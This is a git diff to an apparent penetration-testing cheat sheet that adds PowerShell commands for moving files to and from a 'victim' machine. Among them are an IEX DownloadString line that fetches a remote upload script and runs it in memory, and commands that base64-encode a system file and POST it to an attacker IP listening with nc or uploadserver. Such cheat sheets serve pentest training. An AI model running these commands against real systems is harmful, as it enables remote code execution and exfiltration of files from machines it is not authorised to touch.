@@ -128,8 +128,7 @@ lport => 8080This should return two numbers, which are the number of rows and co
 
 stty -rows 48 -columns 120
 
-<a name="FileTransfer"/>
-# File Transfer
+# File Transfer to Victim
 
 ## PowerShell - BASE64
 - KALI: `cat file | base64 -w 0;echo`
@@ -165,7 +164,21 @@ If you get an error, use an account name and password:
 - KALI: `sudo python3 -m pyftpdlib --port 21`
 - VICTIM: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.1.13/file', 'file')`
 
-# File-Transfer-From-Victim
+# File Transfer From Victim
+
+## PowerShell - Base64
+- VICTIM: `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
+
+# PowerShell - POST Upload
+- KALI: `pip3 install uploadserver`
+- KALI: `python3 -m uploadserver`
+- VICTIM: `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
+- VICTIM: `Invoke-FileUpload -Uri http://192.168.1.13:8000/upload -File C:\Windows\System32\drivers\etc\hosts`
+
+# PowerShell - Base64 POST Upload
+- KALI: `nc -lvnp 8000`
+- VICTIM: `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
+ - VICTIM: `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
 
 # Redis
 
